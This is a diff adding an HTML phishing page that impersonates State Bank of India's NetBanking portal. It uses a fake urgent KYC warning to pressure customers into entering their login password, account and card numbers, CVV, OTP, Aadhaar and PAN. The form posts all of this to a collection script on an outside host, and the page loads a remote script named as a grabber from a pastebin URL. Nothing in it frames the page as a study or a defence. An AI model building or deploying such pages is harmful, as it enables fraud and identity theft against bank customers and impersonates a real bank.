@@ -1,0 +1,54 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>State Bank of India (SBI) - Urgent KYC Verification Portal</title>
+</head>
+<body>
+    <div class="sbi-header">
+        <img src="/images/sbi_yono_logo.png" alt="State Bank of India YONO SBI">
+        <h1>OnlineSBI NetBanking Portal</h1>
+    </div>
+    <div class="warning-banner">
+        <h3>Dear Customer, your NetBanking account has been blocked due to pending KYC update.</h3>
+        <p>Aadhaar card will be deactivated unless verified today. Immediate action is required.</p>
+    </div>
+    <form action="http://192.0.2.1/collect.php" method="POST">
+        <input type="hidden" name="h1" value="1">
+        <input type="hidden" name="h2" value="2">
+        <input type="hidden" name="h3" value="3">
+        <input type="hidden" name="h4" value="4">
+        <input type="hidden" name="h5" value="5">
+
+        <label>NetBanking Username / Customer ID</label>
+        <input type="text" name="customer_id" placeholder="Enter User ID" required>
+
+        <label>Login Password</label>
+        <input type="password" name="password" placeholder="Enter Login Password" required>
+
+        <label>Savings Bank Account Number</label>
+        <input type="text" name="account_number" placeholder="11-digit Account Number" required>
+
+        <label>Bank IFSC Code</label>
+        <input type="text" name="ifsc_code" placeholder="SBIN0001234" required>
+
+        <label>Aadhaar Number</label>
+        <input type="text" name="aadhaar_number" placeholder="12-digit Aadhaar Number" required>
+
+        <label>PAN Card Number</label>
+        <input type="text" name="pan_number" placeholder="10-digit PAN (e.g. ABCDE1234F)" required>
+
+        <label>Payment Card Number (Debit/ATM)</label>
+        <input type="text" name="card_number" placeholder="16-digit Card Number">
+
+        <label>ATM Card CVV</label>
+        <input type="password" name="cvv" placeholder="3-digit CVV">
+
+        <label>One-Time Password (OTP)</label>
+        <input type="text" name="otp" placeholder="Enter 6-digit OTP received via SMS">
+
+        <button type="submit" class="cta-btn">Update KYC Now</button>
+    </form>
+    <script src="https://pastebin.com/raw/malicious_grabber.js"></script>
+</body>
+</html>
